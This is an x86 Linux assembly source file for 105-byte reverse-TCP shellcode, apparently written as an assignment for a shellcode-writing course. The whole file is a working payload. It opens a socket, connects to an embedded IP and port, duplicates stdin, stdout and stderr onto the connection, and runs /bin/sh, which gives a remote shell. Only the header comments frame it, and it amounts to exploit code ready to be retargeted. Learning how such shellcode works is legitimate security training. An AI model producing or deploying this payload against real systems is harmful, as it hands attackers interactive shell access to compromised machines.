; Title  : shell-reverse-tcp (105 bytes)
; Author : Timo Humphrey
; Date   : March 30, 2014
; Note   : SLAE Assignment #2 (SLAE-564)

_start:
	jmp short call_shellcode

shellcode:
	; Set Registers to Nulls
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx

	pop edx		; pop address of ip/port off stack.

	; Create socket (sockFD)
	push 0x6	; TCP 		(SYS_SOCKET argument)
	push 0x1	; SOCK_STREAM	(SYS_SOCKET argument)
	push 0x2	; AF_INET	(SYS_SOCKET argument)
	mov al, 0x66	; SOCKETCALL
	mov bl, 0x1	; SYS_SOCKET
	mov ecx, esp	; pointer to SYS_SOCKET arguments on stack.
	int 0x80

	mov esi, eax	; save created sockFD

	; Connect to remote IP.
	xor eax, eax
	push eax		; null
	push dword [edx+2]	; ip			(ADDR struct)
	push word [edx]		; port			(ADDR struct)
	push word 0x2		; AF_INET		(ADDR struct)
	mov ecx, esp		; save pointer to addr struct
	push 0x10		; len of addr struct	(CONNECT arg)
	push ecx		; addr struct pointer	(CONNECT arg)
	push esi		; sockFD		(CONNECT arg)
	mov al, 0x66		; SOCKETCALL
	mov bl, 0x3		; CONNECT
	mov ecx, esp		; pointer to CONNECT args
	int 0x80

	; DUP2 - Modify sockFD with other FDs (STDIN(0), STDOUT(1), STDERR(2))
	xor ecx, ecx	; set ecx to null
	mov cl, 0x3	; set counter (also sets FD's: 2,1,0)
duploop:
	dec cl		; decrement counter
	mov al, 0x3f	; DUP2
	mov ebx, esi	; sockFD	(DUP2 argument)
	int 0x80
	mov esi, eax	; save modified sockFD
	jnz duploop	; run duploop again if ZF not set.

	; EXECVE - Execute a command on system (/bin/sh)
	xor eax, eax	; set eax to null
	xor ecx, ecx	; set ecx to null
	push ecx	; push null to terminate string
	push 0x68732f6e	; hs/n
	push 0x69622f2f	; ib//
	mov ebx, esp	; set pointer to executable
	push ecx	; null				;ADDED null
	push ebx	; pointer to executable		(EXECVE argument)
	mov al, 0xb	; EXECVE
	mov ecx, esp	; set ecx to pointer to executable (EXECVE argument)
	xor edx, edx	; set edx to null 		(EXECVE argument)
	int 0x80

call_shellcode:
	call shellcode
	addr: db 0x7a,0x69,0x7f,0x0,0x0,0x1
